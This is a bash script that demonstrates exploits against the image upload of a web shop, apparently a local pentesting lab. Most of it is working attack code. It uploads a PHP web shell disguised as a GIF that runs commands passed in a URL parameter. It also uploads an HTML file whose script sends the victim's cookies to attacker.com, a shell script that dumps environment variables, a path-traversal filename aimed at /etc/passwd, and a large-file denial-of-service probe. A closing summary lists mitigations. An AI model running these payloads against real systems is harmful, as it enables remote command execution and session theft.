#!/bin/bash

# Image Upload Exploit Demonstration Script
# This script demonstrates various ways to exploit the image upload vulnerability
# in the pentesting web shop application.

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
BASE_URL="http://localhost:3001"
REGISTER_URL="$BASE_URL/api/users"
LOGIN_URL="$BASE_URL/api/users/login"
PRODUCT_REGISTER_URL="$BASE_URL/api/products/register"
STATIC_URL="$BASE_URL/static/images"

# Test user credentials
TEST_USERNAME="exploiter123"
TEST_PASSWORD="password123"
TEST_NAME="Exploit Tester"

echo -e "${BLUE}=== Image Upload Exploit Demonstration ===${NC}"
echo -e "${YELLOW}Target: $BASE_URL${NC}"
echo

# Function to create a test user and get auth token
get_auth_token() {
    echo -e "${BLUE}[1] Creating test user and obtaining auth token...${NC}"
    
    # Register user
    REGISTER_RESPONSE=$(curl -s -X POST "$REGISTER_URL" \
        -H "Content-Type: application/json" \
        -d "{\"username\":\"$TEST_USERNAME\",\"password\":\"$TEST_PASSWORD\",\"name\":\"$TEST_NAME\"}")
    
    echo "Register response: $REGISTER_RESPONSE"
    
    # Login to get token (cookies will be saved)
    LOGIN_RESPONSE=$(curl -s -c /tmp/cookies.txt -X POST "$LOGIN_URL" \
        -H "Content-Type: application/json" \
        -d "{\"username\":\"$TEST_USERNAME\",\"password\":\"$TEST_PASSWORD\"}")
    
    echo "Login response: $LOGIN_RESPONSE"
    
    # Check if login was successful by looking for success message
    if echo "$LOGIN_RESPONSE" | grep -q "Login successful"; then
        echo -e "${GREEN}✓ Authentication successful${NC}"
        # Extract the token from cookies file
        if [ -f /tmp/cookies.txt ]; then
            TOKEN=$(grep "accessToken" /tmp/cookies.txt | cut -f7)
        fi
        return 0
    else
        echo -e "${RED}✗ Failed to authenticate${NC}"
        echo "Login Response: $LOGIN_RESPONSE"
        return 1
    fi
}

# Exploit 1: Upload PHP Web Shell disguised as image
upload_php_webshell() {
    echo -e "\n${BLUE}[2] Exploit 1: Uploading PHP Web Shell disguised as image${NC}"
    
    # Create a PHP web shell with image-like content
    cat > /tmp/malicious_image.php << 'EOF'
GIF89a
<?php
// Simple PHP Web Shell
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "<pre>";
    echo "Executing: " . htmlspecialchars($cmd) . "\n\n";
    system($cmd);
    echo "</pre>";
} else {
    echo "<form method='GET'>";
    echo "<input type='text' name='cmd' placeholder='Enter command' style='width: 300px;'>";
    echo "<input type='submit' value='Execute'>";
    echo "</form>";
}
?>
EOF

    # Upload the malicious file
    UPLOAD_RESPONSE=$(curl -s -b /tmp/cookies.txt -X POST "$PRODUCT_REGISTER_URL" \
        -F "name=Innocent Product" \
        -F "description=This is a normal product" \
        -F "price=9.99" \
        -F "category=Electronics" \
        -F "image=@/tmp/malicious_image.php;type=image/gif")
    
    # Extract the uploaded file URL
    FILE_URL=$(echo "$UPLOAD_RESPONSE" | grep -o '"image":"[^"]*' | cut -d'"' -f4)
    
    if [ -n "$FILE_URL" ]; then
        echo -e "${GREEN}✓ PHP Web Shell uploaded successfully${NC}"
        echo -e "${YELLOW}File URL: $FILE_URL${NC}"
        echo -e "${RED}⚠️  Try accessing: $FILE_URL?cmd=whoami${NC}"
    else
        echo -e "${RED}✗ Upload failed${NC}"
        echo "Response: $UPLOAD_RESPONSE"
    fi
    
    # Clean up
    rm -f /tmp/malicious_image.php
}

# Exploit 2: Upload HTML file with JavaScript (XSS)
upload_html_xss() {
    echo -e "\n${BLUE}[3] Exploit 2: Uploading HTML file with JavaScript (Stored XSS)${NC}"
    
    # Create malicious HTML file
    cat > /tmp/malicious_image.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Malicious Image</title>
</head>
<body>
    <h1>Stored XSS Demonstration</h1>
    <script>
        // This would execute when someone views the "image"
        alert('XSS Vulnerability: Cookies = ' + document.cookie);
        
        // Could also be used to steal session tokens
        if (document.cookie) {
            fetch('http://attacker.com/steal?cookies=' + encodeURIComponent(document.cookie));
        }
        
        // Redirect to a phishing page
        // window.location.href = 'http://attacker.com/phishing';
    </script>
    <p>This HTML file was uploaded as an "image".</p>
</body>
</html>
EOF

    # Upload the malicious HTML file
    UPLOAD_RESPONSE=$(curl -s -b /tmp/cookies.txt -X POST "$PRODUCT_REGISTER_URL" \
        -F "name=XSS Product" \
        -F "description=Contains stored XSS" \
        -F "price=1.99" \
        -F "category=Security" \
        -F "image=@/tmp/malicious_image.html;type=image/jpeg")
    
    FILE_URL=$(echo "$UPLOAD_RESPONSE" | grep -o '"image":"[^"]*' | cut -d'"' -f4)
    
    if [ -n "$FILE_URL" ]; then
        echo -e "${GREEN}✓ HTML file with XSS uploaded successfully${NC}"
        echo -e "${YELLOW}File URL: $FILE_URL${NC}"
        echo -e "${RED}⚠️  Accessing this URL in a browser will trigger XSS${NC}"
    else
        echo -e "${RED}✗ Upload failed${NC}"
        echo "Response: $UPLOAD_RESPONSE"
    fi
    
    # Clean up
    rm -f /tmp/malicious_image.html
}

# Exploit 3: Upload file with executable extension but image MIME type
upload_executable_disguised() {
    echo -e "\n${BLUE}[4] Exploit 3: Uploading executable file with image MIME type${NC}"
    
    # Create a script file
    cat > /tmp/malicious_script.sh << 'EOF'
#!/bin/bash
echo "This is a malicious script that was uploaded as an image!"
echo "Current user: $(whoami)"
echo "Current directory: $(pwd)"
echo "Environment variables:"
env | head -10
EOF

    # Upload the script with image MIME type
    UPLOAD_RESPONSE=$(curl -s -b /tmp/cookies.txt -X POST "$PRODUCT_REGISTER_URL" \
        -F "name=Script Product" \
        -F "description=Executable script disguised as image" \
        -F "price=0.99" \
        -F "category=Tools" \
        -F "image=@/tmp/malicious_script.sh;type=image/png")
    
    FILE_URL=$(echo "$UPLOAD_RESPONSE" | grep -o '"image":"[^"]*' | cut -d'"' -f4)
    
    if [ -n "$FILE_URL" ]; then
        echo -e "${GREEN}✓ Executable script uploaded successfully${NC}"
        echo -e "${YELLOW}File URL: $FILE_URL${NC}"
        echo -e "${RED}⚠️  File could be executed if server has script execution enabled${NC}"
    else
        echo -e "${RED}✗ Upload failed${NC}"
        echo "Response: $UPLOAD_RESPONSE"
    fi
    
    # Clean up
    rm -f /tmp/malicious_script.sh
}

# Exploit 4: Test for path traversal (though this specific implementation may be protected)
upload_path_traversal_attempt() {
    echo -e "\n${BLUE}[5] Exploit 4: Testing for path traversal vulnerabilities${NC}"
    
    # Create a simple text file
    echo "Path traversal test file" > /tmp/traversal_test.txt
    
    # Attempt to upload with manipulated filename
    # Note: This specific attack may not work due to the filename generation,
    # but it's worth testing for completeness
    UPLOAD_RESPONSE=$(curl -s -b /tmp/cookies.txt -X POST "$PRODUCT_REGISTER_URL" \
        -F "name=Traversal Test" \
        -F "description=Testing path traversal" \
        -F "price=0.01" \
        -F "category=Test" \
        -F "image=@/tmp/traversal_test.txt;filename=../../../etc/passwd;type=image/jpeg")
    
    FILE_URL=$(echo "$UPLOAD_RESPONSE" | grep -o '"image":"[^"]*' | cut -d'"' -f4)
    
    if [ -n "$FILE_URL" ]; then
        echo -e "${YELLOW}Upload completed: $FILE_URL${NC}"
        echo -e "${BLUE}Note: Path traversal may be mitigated by filename generation${NC}"
    else
        echo -e "${RED}✗ Upload failed${NC}"
    fi
    
    # Clean up
    rm -f /tmp/traversal_test.txt
}

# Exploit 5: Upload large file to test DoS potential
upload_large_file() {
    echo -e "\n${BLUE}[6] Exploit 5: Testing file size limits (DoS potential)${NC}"
    
    # Create a large file (but within the 5MB limit to ensure upload)
    echo -e "${YELLOW}Creating 4MB test file...${NC}"
    dd if=/dev/zero of=/tmp/large_image.jpg bs=1024 count=4096 2>/dev/null
    
    # Upload the large file
    echo -e "${YELLOW}Uploading large file...${NC}"
    START_TIME=$(date +%s)
    UPLOAD_RESPONSE=$(curl -s -b /tmp/cookies.txt -X POST "$PRODUCT_REGISTER_URL" \
        -F "name=Large Image Product" \
        -F "description=Testing large file upload" \
        -F "price=19.99" \
        -F "category=Test" \
        -F "image=@/tmp/large_image.jpg;type=image/jpeg")
    END_TIME=$(date +%s)
    
    UPLOAD_TIME=$((END_TIME - START_TIME))
    
    FILE_URL=$(echo "$UPLOAD_RESPONSE" | grep -o '"image":"[^"]*' | cut -d'"' -f4)
    
    if [ -n "$FILE_URL" ]; then
        echo -e "${GREEN}✓ Large file uploaded successfully in ${UPLOAD_TIME}s${NC}"
        echo -e "${YELLOW}File URL: $FILE_URL${NC}"
        echo -e "${RED}⚠️  Multiple large file uploads could impact server performance${NC}"
    else
        echo -e "${RED}✗ Large file upload failed${NC}"
        echo "Response: $UPLOAD_RESPONSE"
    fi
    
    # Clean up
    rm -f /tmp/large_image.jpg
}

# Summary and recommendations
print_summary() {
    echo -e "\n${BLUE}=== Vulnerability Summary ===${NC}"
    echo -e "${RED}The following vulnerabilities were identified:${NC}"
    echo -e "1. ${YELLOW}Insufficient File Type Validation${NC} - MIME type can be spoofed"
    echo -e "2. ${YELLOW}Unrestricted File Upload${NC} - Any file type can be uploaded"
    echo -e "3. ${YELLOW}Direct File Access${NC} - Uploaded files are directly accessible via HTTP"
    echo -e "4. ${YELLOW}No Content Validation${NC} - File contents are not validated"
    echo -e "5. ${YELLOW}Potential DoS${NC} - Large file uploads could impact server performance"
    echo
    echo -e "${GREEN}=== Recommended Mitigations ===${NC}"
    echo -e "1. Implement proper file type validation (check magic bytes, not just MIME type)"
    echo -e "2. Restrict file extensions to only safe image formats (jpg, png, gif)"
    echo -e "3. Validate file contents using image processing libraries"
    echo -e "4. Store uploaded files outside the web root"
    echo -e "5. Implement virus scanning for uploaded files"
    echo -e "6. Add file size limits and rate limiting for uploads"
    echo -e "7. Use Content Security Policy headers"
    echo -e "8. Rename files to prevent execution (remove executable extensions)"
    echo
}

# Main execution
main() {
    if get_auth_token; then
        upload_php_webshell
        upload_html_xss
        upload_executable_disguised
        upload_path_traversal_attempt
        upload_large_file
        print_summary
        # Clean up
        rm -f /tmp/cookies.txt
    else
        echo -e "${RED}Failed to authenticate. Cannot proceed with exploits.${NC}"
        rm -f /tmp/cookies.txt
        exit 1
    fi
}

# Check if curl is available
if ! command -v curl &> /dev/null; then
    echo -e "${RED}Error: curl is required but not installed.${NC}"
    exit 1
fi

# Run the main function
main